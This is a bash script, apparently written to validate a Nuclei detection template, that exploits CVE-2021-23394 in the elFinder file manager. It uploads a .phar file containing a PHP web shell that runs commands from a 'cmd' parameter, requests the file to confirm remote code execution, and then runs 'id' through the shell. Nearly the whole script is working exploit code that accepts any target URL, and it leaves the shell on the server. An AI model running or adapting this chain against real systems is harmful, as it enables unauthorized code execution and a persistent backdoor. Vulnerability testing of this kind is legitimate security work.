#!/bin/bash
#
# CVE-2021-23394 - elFinder RCE Local Test Script
# 
# This script automates the exploitation of CVE-2021-23394
# for testing and validation purposes.
#
# Usage:
#   ./run_local_test.sh [target_url]
#
# Example:
#   ./run_local_test.sh http://localhost:8080
#
# Author: princechaddha
# CVE: CVE-2021-23394

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
TARGET="${1:-http://localhost:8080}"
FILENAME="exploit_$(date +%s).phar"
MARKER="NUCLEI_RCE_$(openssl rand -hex 8)"
CONNECTOR_PATHS=(
    "/elFinder/php/connector.minimal.php"
    "/elfinder/php/connector.minimal.php"
    "/php/connector.minimal.php"
)
FILE_PATHS=(
    "/elFinder/files"
    "/elfinder/files"
    "/files"
)

echo "=============================================="
echo "CVE-2021-23394 - elFinder RCE Test Script"
echo "=============================================="
echo ""
echo "Target:   $TARGET"
echo "Filename: $FILENAME"
echo "Marker:   $MARKER"
echo ""

# Create simple PHAR payload
PAYLOAD="<?php echo '$MARKER'; if(isset(\$_GET['cmd'])){system(\$_GET['cmd']);} ?>"
echo "$PAYLOAD" > /tmp/$FILENAME

echo "[*] Payload created: /tmp/$FILENAME"
echo "[*] Payload content: $PAYLOAD"
echo ""

# Function to test a connector path
test_connector() {
    local connector_path=$1
    local file_path=$2
    local full_url="${TARGET}${connector_path}"
    
    echo "----------------------------------------------"
    echo "[*] Testing connector: $connector_path"
    echo "----------------------------------------------"
    
    # Step 1: Upload .phar file
    echo ""
    echo "[STEP 1] Uploading .phar file..."
    echo "POST $connector_path"
    
    UPLOAD_RESPONSE=$(curl -s -X POST "$full_url" \
        -F "cmd=upload" \
        -F "target=l1_Lw" \
        -F "upload[]=@/tmp/$FILENAME;type=application/octet-stream" \
        2>/dev/null || echo "CURL_ERROR")
    
    if [[ "$UPLOAD_RESPONSE" == "CURL_ERROR" ]]; then
        echo -e "${RED}[FAIL] Connection failed${NC}"
        return 1
    fi
    
    echo "Response: $UPLOAD_RESPONSE"
    
    # Check if upload succeeded
    if echo "$UPLOAD_RESPONSE" | grep -q '"added"'; then
        echo -e "${GREEN}[PASS] Upload successful${NC}"
        
        # Extract hash
        FILE_HASH=$(echo "$UPLOAD_RESPONSE" | grep -oP '"hash":"(l1_[A-Za-z0-9_-]+)"' | head -1 | cut -d'"' -f4)
        echo "[*] File hash: $FILE_HASH"
    else
        echo -e "${YELLOW}[WARN] Upload may have failed${NC}"
    fi
    
    echo ""
    
    # Step 2: Trigger RCE by accessing the file
    echo "[STEP 2] Triggering RCE..."
    echo "GET ${file_path}/${FILENAME}"
    
    RCE_URL="${TARGET}${file_path}/${FILENAME}"
    RCE_RESPONSE=$(curl -s "$RCE_URL" 2>/dev/null || echo "CURL_ERROR")
    
    if [[ "$RCE_RESPONSE" == "CURL_ERROR" ]]; then
        echo -e "${RED}[FAIL] Connection failed${NC}"
        return 1
    fi
    
    echo "Response: $RCE_RESPONSE"
    
    # Check for marker
    if echo "$RCE_RESPONSE" | grep -q "$MARKER"; then
        echo ""
        echo -e "${GREEN}=============================================="
        echo "[SUCCESS] RCE CONFIRMED!"
        echo "=============================================="
        echo "Marker found in response: $MARKER"
        echo ""
        echo "[STEP 3] Testing command execution..."
        echo "GET ${file_path}/${FILENAME}?cmd=id"
        
        CMD_RESPONSE=$(curl -s "${RCE_URL}?cmd=id" 2>/dev/null)
        echo "Response: $CMD_RESPONSE"
        
        if echo "$CMD_RESPONSE" | grep -qE "uid=[0-9]+"; then
            echo ""
            echo -e "[SUCCESS] Command execution works!${NC}"
        fi
        
        return 0
    else
        echo -e "${RED}[FAIL] Marker not found - RCE did not trigger${NC}"
        return 1
    fi
}

# Test each connector path
VULNERABLE=0
for i in "${!CONNECTOR_PATHS[@]}"; do
    if test_connector "${CONNECTOR_PATHS[$i]}" "${FILE_PATHS[$i]}"; then
        VULNERABLE=1
        break
    fi
    echo ""
done

echo ""
echo "=============================================="
echo "SUMMARY"
echo "=============================================="

if [ $VULNERABLE -eq 1 ]; then
    echo -e "${GREEN}[VULNERABLE] Target is vulnerable to CVE-2021-23394${NC}"
    echo ""
    echo "Exploitation successful:"
    echo "  - .phar file uploaded"
    echo "  - PHP code executed"
    echo "  - Marker detected: $MARKER"
else
    echo -e "${YELLOW}[NOT VULNERABLE] Target does not appear vulnerable${NC}"
    echo ""
    echo "Possible reasons:"
    echo "  - elFinder is patched (>= 2.1.58)"
    echo "  - .phar files blocked by upload filter"
    echo "  - Server does not parse .phar as PHP"
    echo "  - Different installation path"
fi

echo ""
echo "[*] Cleaning up..."
rm -f /tmp/$FILENAME

echo "[*] Done!"
